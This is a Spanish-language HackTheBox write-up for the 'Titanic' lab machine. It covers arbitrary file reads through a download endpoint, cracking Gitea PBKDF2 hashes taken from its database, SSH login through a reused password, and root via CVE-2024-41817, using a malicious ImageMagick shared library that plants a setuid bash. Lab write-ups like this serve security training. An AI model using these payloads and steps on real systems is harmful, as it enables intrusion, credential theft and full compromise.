@@ -1,0 +1,461 @@
+---
+title: "Máquina Titanic"
+description: "Resolución de la máquina Titanic de HackTheBox"
+tags: ["AFR", "CVE-2024-41817"]
+categories: ["HackTheBox", "Easy", "Linux"]
+logo: "/assets/writeups/titanic/logo.png"
+---
+
+Una página de adquisisión de puestos para un viaje en crucero es vulnerable a lectura arbitraria de archivos, la cual podremos utilizar para obtener la base de datos de una instancia de Gitea hospedada en el servidor. Escalaremos privilegios abusando de una tarea automatizada que es vulnerable a un CVE de ImageMagick.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+Nmap scan report for 10.10.11.55
+Host is up, received user-set (0.24s latency).
+Scanned at 2025-06-19 15:23:53 -04 for 213s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 213.96 seconds
+           Raw packets sent: 68138 (2.998MB) | Rcvd: 68011 (2.721MB)
+```
+
+En el puerto 80 tenemos un servidor web que nos redirigue a `titanic.htb`. Vamos a agregar este dominio a nuestro archivo de hosts:
+
+```bash
+10.10.11.55 titanic.htb 
+```
+{: file="/etc/hosts" }
+
+Dicho servidor web contiene una página para tomar boletos para un viaje en crucero:
+
+![Webpage](/assets/writeups/titanic/1.png)
+
+Nos da una opción para anotarnos en el viaje, pero del resto no podemos hacer nada más... asi que veamos que logramos con esto.
+
+## Intrusión
+
+Interceptando las peticiones HTTP al anotarnos para el viaje en crucero, veremos que hay una petición a un endpoint que nos descarga un boleto en formato JSON:
+
+```bash
+HTTP/1.1 302 FOUND
+Date: Thu, 19 Jun 2025 19:26:03 GMT
+Server: Werkzeug/3.0.3 Python/3.10.12
+Content-Type: text/html; charset=utf-8
+Content-Length: 303
+Location: /download?ticket=cd8d0903-c71f-4c1d-8db9-23923f6a81b0.json
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+... [snip]
+```
+
+Si al endpoint intentamos hacerle una petición por el fichero `/etc/passwd`:
+
+```bash
+❯ curl -v "http://titanic.htb/download?ticket=/etc/passwd"
+* Host titanic.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.55
+*   Trying 10.10.11.55:80...
+* Connected to titanic.htb (10.10.11.55) port 80
+* using HTTP/1.x
+> GET /download?ticket=/etc/passwd HTTP/1.1
+> Host: titanic.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 19 Jun 2025 19:32:54 GMT
+< Server: Werkzeug/3.0.3 Python/3.10.12
+< Content-Disposition: attachment; filename="/etc/passwd"
+< Content-Type: application/octet-stream
+< Content-Length: 1951
+< Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
+< Cache-Control: no-cache
+< ETag: "1738926979.4294043-1951-393413677"
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+... [snip]
+```
+
+¡Es vulnerable a lectura arbitraria de archivos!
+
+En el archivo `passwd` podremos ver que hay un usuario llamado `developer` en el sistema. Si intentamos leer su `.bashrc` veremos que tenemos permisos de lectura en su directorio:
+
+```bash
+❯ curl -v "http://titanic.htb/download?ticket=/home/developer/.bashrc"
+* Host titanic.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.55
+*   Trying 10.10.11.55:80...
+* Connected to titanic.htb (10.10.11.55) port 80
+* using HTTP/1.x
+> GET /download?ticket=/home/developer/.bashrc HTTP/1.1
+> Host: titanic.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 19 Jun 2025 19:35:20 GMT
+< Server: Werkzeug/3.0.3 Python/3.10.12
+< Content-Disposition: attachment; filename="/home/developer/.bashrc"
+< Content-Type: application/octet-stream
+< Content-Length: 3771
+< Last-Modified: Thu, 06 Jan 2022 16:23:33 GMT
+< Cache-Control: no-cache
+< ETag: "1641486213.0-3771-1706690718"
+< 
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+... [snip]
+```
+
+y también podremos leer la primera flag de a primeras, a secas.
+
+```bash
+❯ curl -v "http://titanic.htb/download?ticket=/home/developer/user.txt"
+* Host titanic.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.55
+*   Trying 10.10.11.55:80...
+* Connected to titanic.htb (10.10.11.55) port 80
+* using HTTP/1.x
+> GET /download?ticket=/home/developer/user.txt HTTP/1.1
+> Host: titanic.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 19 Jun 2025 19:35:35 GMT
+< Server: Werkzeug/3.0.3 Python/3.10.12
+< Content-Disposition: attachment; filename="/home/developer/user.txt"
+< Content-Type: text/plain; charset=utf-8
+< Content-Length: 33
+< Last-Modified: Thu, 19 Jun 2025 18:20:04 GMT
+< Cache-Control: no-cache
+< ETag: "1750357204.235959-33-1893075274"
+< 
+ad75b9839ff59fb34787ffdc28******
+```
+
+Ahora solo tendremos que hacernos con la última flag.
+
+## Escalada de privilegios
+
+Vale, tenemos la primera flag y demás... pero seguimos necesitando acceso a la máquina para tomar control total de ella, y en el código de esta aplicación no hay nada interesante. Podriamos buscar por subdominios a ver si encontramos alguno del cual podamos leer sus archivos:
+
+```bash
+❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 20 -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb"
+
+        / ___\  / ___\           / ___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.55
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.titanic.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 20
+________________________________________________
+
+dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 164ms]
+```
+
+Encontramos este, que es una instancia de Gitea la cual posee unos repositorios interesantes:
+
+![Gitea](/assets/writeups/titanic/2.png)
+
+El primer repositorio contiene dos archivos de Docker Compose con los siguientes contenidos:
+
+```yaml
+version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+```
+{: file="gitea/docker-compose.yml" }
+
+```yaml
+version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets 
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+```
+{: file="mysql/docker-compose.yml" }
+
+El segundo archivo tiene una contraseña pero no nos sirve de absolutamente nada, pero el primero si nos sirve para algo interesante: nos dice que el directorio de datos del Gitea está en el directorio personal de `developer`, al cual nosotros tenemos acceso. En dicho directorio, si Gitea está utilizando SQLite como driver de base de datos, estará el archivo del mismo. Y viendo si existe, efectivamente:
+
+```bash
+❯ curl -v "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db"
+* Host titanic.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.55
+*   Trying 10.10.11.55:80...
+* Connected to titanic.htb (10.10.11.55) port 80
+* using HTTP/1.x
+> GET /download?ticket=/home/developer/gitea/data/gitea/gitea.db HTTP/1.1
+> Host: titanic.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 19 Jun 2025 19:45:42 GMT
+< Server: Werkzeug/3.0.3 Python/3.10.12
+< Content-Disposition: attachment; filename="/home/developer/gitea/data/gitea/gitea.db"
+< Content-Type: application/octet-stream
+< Content-Length: 2084864
+< Last-Modified: Thu, 19 Jun 2025 19:07:17 GMT
+< Cache-Control: no-cache
+< ETag: "1750360037.1558354-2084864-1097404214"
+< 
+Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" 
+Warning: to save to a file.
+* client returned ERROR on write of 2303 bytes
+* closing connection #0
+```
+
+Tendremos algunos hashes para crackear:
+
+```bash
+❯ sqlite3 uwu.db 
+SQLite version 3.49.2 2025-05-07 10:39:52
+Enter ".help" for usage hints.
+sqlite> select * from user;
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
+```
+
+Antes de crackearlos, vamos a tener que parsearlos a algo que hashcat pueda entender:
+
+Primero, tomaremos el salt y el hash, y lo decodificaremos de hexadecimal a base64:
+
+```bash
+❯ echo "8bf3e3452b78544f8bee9400d6936d34" | xxd -r -ps | base64 -w 0
+i/PjRSt4VE+L7pQA1pNtNA==
+
+❯ echo "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56" | xxd -r -ps | base64 -w 0
+5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+```
+
+Ahora tomaremos la parte del algortimo y las iteraciones de PBKDF2 para crear un formato así:
+
+```bash
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+```
+
+Esto es legible por hashcat, y también es una contraseña débil:
+
+```bash
+❯ hashcat hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+10900 | PBKDF2-HMAC-SHA256 | Generic KDF
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+```
+
+Con esto ya tendremos acceso al sistema, ya que la contraseña es reutilizada en SSH:
+
+```bash
+❯ /usr/bin/ssh developer@titanic.htb
+developer@titanic.htb password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Jun 19 08:14:22 PM UTC 2025
+
+  System load:           0.15
+  Usage of /:            66.0% of 6.79GB
+  Memory usage:          13%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.55
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:d072
+... [snip]
+developer@titanic:~$ 
+```
+
+Buscando por maneras de escalar privilegios, encontramos algo en `/opt/scripts`:
+
+```bash
+developer@titanic:/opt/scripts$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Feb  7 10:37 .
+drwxr-xr-x 5 root root 4096 Feb  7 10:37 ..
+-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
+developer@titanic:/opt/scripts$ cat identify_images.sh 
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
+Esto probablemente lo esté ejecutando un cron como root. Parece que simplemente está guardando registros de la identificación de imágenes en `/opt/app/static/assets/images` al archivo `metadata.log`, que por cierto podemos encontrar en el mismo directorio indicado:
+
+```bash
+developer@titanic:/opt/app/static/assets/images$ ls -la
+total 1288
+drwxrwx--- 2 root developer   4096 Feb  3 17:13 .
+drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
+-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
+-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
+-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
+-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
+-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
+-rw-r----- 1 root developer    442 Jun 19 20:18 metadata.log
+```
+
+El propietario es `root`, lo que confirma nuestra sospecha.
+
+Viendo que la versión de ImageMagick es la `7.1.1-35`, podriamos buscar vulnerabilidades de la misma a ver si encontramos algo interesante. En eso hallaremos a `CVE-2024-41817`, que se trata de un error de lógica en la versión del software compilada en AppImage; Al quedar las variables de entorno `MAGICK_CONFIGURE_PATH` y `LD_LIBRARY_PATH` vacías por lo dicho previamente, el mismo software puede intentar utilizar el directorio actual como un lugar para buscar por librerías dinámicas o archivos de configuración. Y de hecho el `buildID` del binario en la máquina es idéntico al del que se utiliza para el desarrollo del PoC del advisory:
+
+```bash
+❯ curl -fL https://github.com/ImageMagick/ImageMagick/releases/download/7.1.1-35/ImageMagick-d775d2a-gcc-x86_64.AppImage -o magick && chmod +x magick
+❯ file magick 
+magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
+
+----
+developer@titanic:/opt/app/static/assets/images$ file /usr/bin/magick
+/usr/bin/magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
+```
+
+Sabiendo que en efecto, esto es vulnerable, podemos proceder a crearnos un shared object malicioso con el propio código que es proporcionado en el PoC y almacenarlo dentro del directorio en el que script está procesando las imágenes:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /bin/bash /tmp/uwu && chmod u+s /tmp/uwu");
+    exit(0);
+}
+```
+{: file="uwu.c" }
+
+```bash
+developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <unistd.h>
+> 
+> __attribute__((constructor)) void init(){
+>     system("cp /bin/bash /tmp/uwu && chmod u+s /tmp/uwu");
+>     exit(0);
+> }
+> EOF
+```
+
+Luego de un ratito, veremos que:
+
+```bash
+developer@titanic:/opt/app/static/assets/images$ ls -la /tmp
+total 1424
+drwxrwxrwt 14 root      root         4096 Jun 19 20:33 .
+drwxr-xr-x 19 root      root         4096 Feb  7 10:37 ..
+drwxrwxrwt  2 root      root         4096 Jun 19 19:56 .font-unix
+drwxrwxrwt  2 root      root         4096 Jun 19 19:56 .ICE-unix
+drwx------  3 root      root         4096 Jun 19 19:57 snap-private-tmp
+-rw-------  1 developer developer     305 Jun 19 20:14 ssh_client_ip_developer
+drwx------  3 root      root         4096 Jun 19 19:57 systemd-private-011990855f044c24a7dc22353bf74338-apache2.service-c3zVlT
+drwx------  3 root      root         4096 Jun 19 19:57 systemd-private-011990855f044c24a7dc22353bf74338-ModemManager.service-p2ifUI
+drwx------  3 root      root         4096 Jun 19 19:57 systemd-private-011990855f044c24a7dc22353bf74338-systemd-logind.service-KoB1gw
+drwx------  3 root      root         4096 Jun 19 19:56 systemd-private-011990855f044c24a7dc22353bf74338-systemd-resolved.service-KSFFaq
+drwx------  3 root      root         4096 Jun 19 19:56 systemd-private-011990855f044c24a7dc22353bf74338-systemd-timesyncd.service-8Um5pR
+drwxrwxrwt  2 root      root         4096 Jun 19 19:56 .Test-unix
+-rwsr-xr-x  1 root      root      1396520 Jun 19 20:33 uwu
+drwx------  2 root      root         4096 Jun 19 20:02 vmware-root_610-2731152165
+drwxrwxrwt  2 root      root         4096 Jun 19 19:56 .X11-unix
+drwxrwxrwt  2 root      root         4096 Jun 19 19:56 .XIM-unix
+```
+
+Con esto ya podemos proceder a tomar la última flag.
+
+```bash
+developer@titanic:/opt/app/static/assets/images$ /tmp/uwu -p
+uwu-5.1# cd /root
+uwu-5.1# ls -la
+total 52
+drwx------  7 root root      4096 Jun 19 20:02 .
+drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
+lrwxrwxrwx  1 root root         9 Jan 29 12:29 .bash_history -> /dev/null
+-rw-r--r--  1 root root      3106 Oct 15  2021 .bashrc
+drwx------  2 root root      4096 Jan 27 15:28 .cache
+-rwxr-xr-x  1 root root        68 Feb  5 14:55 cleanup.sh
+drwxrwx---  2 root developer 4096 Feb  3 17:13 images
+-rw-------  1 root root        20 Feb  7 11:25 .lesshst
+drwxr-xr-x  3 root root      4096 Aug  1  2024 .local
+-rw-r--r--  1 root root       161 Jul  9  2019 .profile
+-rwxr-xr-x  1 root root       104 Feb  3 17:26 revert.sh
+-rw-r-----  1 root root        33 Jun 19 20:02 root.txt
+drwx------  3 root root      4096 Aug  1  2024 snap
+drwx------  2 root root      4096 Aug  1  2024 .ssh
+uwu-5.1# cat root.txt
+ebeea52174b91549495668d195******
+```
+
+## Extra
+
+Me pareció extraño que dejaran así el pequeño bug de poder leer la primera flag sin siquiera tener acceso a la máquina. Pensé que luego solucionarian el fallo.
